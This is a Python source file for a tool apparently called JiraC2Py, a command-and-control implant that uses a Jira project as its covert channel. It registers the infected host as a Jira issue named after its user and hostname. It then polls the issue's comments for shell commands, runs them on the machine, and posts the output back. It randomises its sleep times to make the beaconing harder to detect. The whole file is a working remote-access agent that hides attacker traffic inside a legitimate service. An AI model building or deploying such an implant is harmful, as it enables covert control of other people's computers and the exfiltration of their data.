import argparse
from colorama import Fore
from utils import logger
from utils import api
from utils import cmd
from utils.handlers import AsyncQueryRequestor
from config import parse_config
import os
import asyncio
import random

logger =  logger.setup_logger("main")


def print_banner():
    """Prints a hello banner."""
    print("=" * 30)
    print("     Welcome to JiraC2Py")
    print("=" * 30)


async def create_jira_task(requestor: AsyncQueryRequestor, project_key):
    hostname, _ = await cmd.fork_command("hostname")
    whoami, _ = await cmd.fork_command("whoami")

    session_name = f"{whoami.strip()}@{hostname.strip()}"

    payload = api.issue_content(project_key,summary=session_name)

    response = await requestor.post(endpoint="issue", payload=payload)

    return response if response else None
    
async def query_cmd(requestor: AsyncQueryRequestor, issue_id):
    response = await requestor.get(f"issue/{issue_id}/comment")

    if response:
        cmds = {}
        comments =  response["comments"]

        for comment in comments:
            id = comment.get("id")
            comment_content = comment.get("body").get("content")[-1]

            if "attrs" in comment_content.keys():
                panelType = comment_content.get("attrs").get("panelType")
                if panelType != "info":
                    continue
            else:
                continue
            content = comment_content.get("content")[-1].get("content")[-1].get("text")
            
            if content:
                cmds[id] = content
        
        logger.info("Getting cmds from issue")

        return cmds
    else:
        return None
    
async def run_cmd(requestor: AsyncQueryRequestor, issue_id, comment_id, command):
    cmd_out, cmd_err = await cmd.fork_command(command, issue_id, comment_id, requestor, sleep_time)

    payload = api.comment_content(cmd_out.strip() if cmd_out else "None stdout", cmd_err.strip() if cmd_err else "None stderr")

    while True:
        response = await requestor.put(endpoint=f"issue/{issue_id}/comment/{comment_id}", payload=payload)
        if response:
            break
        else:
            logger.error("Fail to put cmd to Server")

    logger.info(f"Job {comment_id} Done")
    job_running.remove(comment_id)

    if response:
        return response
    else:
        return None


async def get_project_key(requestor: AsyncQueryRequestor):
    response = await requestor.get("project")
    if response and len(response) > 0:
        last_project = response[-1]
        if isinstance(last_project, dict) and "key" in last_project.keys():
            return last_project.get("key")
        else:
            return None
    else:
        return None


def parse_arguments():
    """Parses command-line arguments."""
    parser = argparse.ArgumentParser(description="JiraC2Py Tools")
    parser.add_argument("-f", "--file", help="Path to the config file", required=True)
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")
    return parser.parse_args()

async def main():
    """Main function."""
    print_banner()
    args = parse_arguments()
    logger.info(f"Config file: {args.file}")
    logger.info(f"Verbose mode: {'Enabled' if args.verbose else 'Disabled'}")

    if os.path.isabs(args.file):
        conf_path = args.file
    else:
        conf_path = os.path.abspath(args.file)

    # Load Config
    cfg = parse_config(conf_path)
    api_url = cfg.get("api_url")
    api_key = cfg.get("api_key")
    email = cfg.get("email")
    # project_key = cfg.get("project_key")
    sleep_interval = cfg.get("sleep_interval")
    jitter_time = cfg.get("jitter_time")
    cfg["api_key"] = "CENSORED"
    logger.info(f"Config file content: \n{cfg}")

    lower_sleep_time = sleep_interval - sleep_interval*jitter_time/100
    upper_sleep_time = sleep_interval + sleep_interval*jitter_time/100

    requestor = AsyncQueryRequestor(base_url=api_url, email=email, api_key=api_key)

    project_key = await get_project_key(requestor)

    while True:
        session = await create_jira_task(requestor=requestor, project_key=project_key)
        if session:
            session_key = session["key"]
            session_id = session["id"]
            logger.info(f"Created session id {session_id} with key {session_key}")
            break
        else:
            logger.error("Create Issue Failed")
    
    global job_running
    global sleep_time
    job_running = set()

    while True:
        while True:
            cmds = await query_cmd(requestor=requestor, issue_id=session_id)
            if cmds is None:
                pass
            else:
                break
        sleep_time = random.uniform(lower_sleep_time, upper_sleep_time)
        logger.info(f"Sleep Time is: {sleep_time}s")

        for cmd_id, command in cmds.items():
            if cmd_id not in job_running:
                job_running.add(cmd_id)
                logger.info(f"Added command id: {cmd_id}")
                asyncio.create_task(run_cmd(requestor=requestor, issue_id=session_id, comment_id=cmd_id, command=command))

        await asyncio.sleep(sleep_time)


if __name__ == "__main__":
    asyncio.run(main())
